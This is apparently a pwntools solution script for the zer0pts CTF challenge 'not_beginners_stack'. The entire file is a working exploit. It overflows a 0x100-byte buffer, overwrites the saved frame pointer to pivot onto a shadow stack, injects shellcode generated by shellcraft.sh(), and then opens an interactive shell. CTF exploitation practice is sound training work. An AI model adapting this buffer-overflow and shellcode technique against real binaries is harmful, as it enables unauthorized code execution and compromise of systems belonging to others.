from pwn import *

context.arch = 'amd64'
p = process('./not_beginners_stack/chall')
#p = remote('pwn.ctf.zer0pts.com', 9011)

__stack_shadow = 0x600234
payload = b"A"*0x100
payload += p64(__stack_shadow + 0x100)
p.sendafter("Data: ", payload)

shellcode = asm(shellcraft.sh())
payload = p64(__stack_shadow + 0x10) * 2
payload += shellcode

p.sendafter("Data: ", payload)

p.interactive()
